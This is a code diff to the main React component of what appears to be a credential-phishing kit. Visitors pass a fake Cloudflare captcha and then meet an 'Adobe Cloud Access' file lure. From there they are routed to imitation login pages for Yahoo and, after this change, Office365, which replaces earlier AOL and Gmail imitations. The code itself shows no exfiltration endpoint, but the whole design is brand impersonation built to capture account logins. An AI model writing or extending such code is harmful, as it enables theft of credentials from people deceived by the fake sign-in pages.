@@ -2,9 +2,8 @@ import React, { useState, useEffect } from 'react';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
 import YahooLoginPage from './components/YahooLoginPage';
-import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
-import AolLoginPage from './components/AolLoginPage';
-import GmailLoginPage from './components/GmailLoginPage'; // 1. IMPORT GMAIL PAGE
+import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage'; // Import mobile Yahoo page
+import Office365LoginPage from './components/Office365LoginPage'; // IMPORT NEW PAGE
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -35,8 +34,7 @@ function App() {
   const [isLoading, setIsLoading] = useState(true);
   const [captchaVerified, setCaptchaVerified] = useState(false);
   const [showYahooLogin, setShowYahooLogin] = useState(false);
-  const [showAolLogin, setShowAolLogin] = useState(false);
-  const [showGmailLogin, setShowGmailLogin] = useState(false); // 2. ADD NEW STATE FOR GMAIL
+  const [showOffice365Login, setShowOffice365Login] = useState(false); // ADD STATE
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
@@ -51,8 +49,7 @@ function App() {
         const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
         setHasActiveSession(isActive);
         setShowYahooLogin(false);
-        setShowAolLogin(false);
-        setShowGmailLogin(false); // Reset Gmail state
+        setShowOffice365Login(false); // RESET
         if (isActive) setCurrentPage('landing');
         else {
           setCaptchaVerified(false);
@@ -112,8 +109,7 @@ function App() {
     }
     
     setShowYahooLogin(false);
-    setShowAolLogin(false);
-    setShowGmailLogin(false); // Reset Gmail state
+    setShowOffice365Login(false); // RESET
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -125,14 +121,17 @@ function App() {
     setHasActiveSession(false);
     setCaptchaVerified(false);
     setShowYahooLogin(false);
-    setShowAolLogin(false);
-    setShowGmailLogin(false); // Reset Gmail state
+    setShowOffice365Login(false); // RESET
     setCurrentPage('captcha');
   };
 
-  const handleYahooSelect = () => setShowYahooLogin(true);
-  const handleAolSelect = () => setShowAolLogin(true);
-  const handleGmailSelect = () => setShowGmailLogin(true); // 3. ADD HANDLER FOR GMAIL
+  const handleYahooSelect = () => {
+    setShowYahooLogin(true);
+  };
+
+  const handleOffice365Select = () => { // ADD HANDLER
+    setShowOffice365Login(true);
+  };
 
   if (isLoading) {
     return (
@@ -146,17 +145,14 @@ function App() {
     return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
   }
 
-  // 4. UPDATE RENDER LOGIC
   if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
     if (showYahooLogin) {
       const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
       return <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
-    if (showAolLogin) {
-      return <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
-    }
-    if (showGmailLogin) {
-      return <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
+    
+    if (showOffice365Login) { // ADD RENDER LOGIC
+      return <Office365LoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
     
     const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
@@ -164,8 +160,7 @@ function App() {
       <LoginComponent
         fileName="Adobe Cloud Access"
         onYahooSelect={handleYahooSelect}
-        onAolSelect={handleAolSelect}
-        onGmailSelect={handleGmailSelect} // 5. PASS NEW HANDLER
+        onOffice365Select={handleOffice365Select} // PASS PROP
         onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
